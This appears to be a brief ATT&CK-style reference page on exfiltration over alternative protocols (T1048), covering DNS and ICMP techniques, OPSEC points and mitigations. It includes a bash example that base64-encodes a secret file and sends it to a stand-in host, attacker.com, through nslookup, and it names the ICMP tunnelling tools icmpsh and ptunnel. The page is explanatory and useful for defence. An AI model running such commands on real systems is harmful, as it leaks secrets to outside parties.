# Exfiltration Over Alternative Protocol (T1048)

## Overview
Adversaries may steal data by transferring it over a different protocol than the one used for command and control.

## Techniques

### 1. DNS Exfiltration (T1048.003)
Encoding data into subdomains of DNS queries sent to an attacker-controlled DNS server.
```bash
# Example: Sending a base64 encoded string as a subdomain
data=$(cat secret.txt | base64 | tr -d '\n')
nslookup ${data}.attacker.com
```

### 2. ICMP Exfiltration
Hiding data within the data field of ICMP Echo Request (ping) packets.
* **Tool:** `icmpsh`, `ptunnel`.

## OPSEC Considerations
* DNS exfiltration is slow and creates a massive number of DNS requests, which can be easily detected by traffic analysis.
* ICMP exfiltration requires certain firewall rules to be in place.

## Mitigations
* Monitor for unusual DNS query patterns and high volumes of DNS traffic to unknown domains.
* Implement Deep Packet Inspection (DPI) to identify non-standard data within protocols.
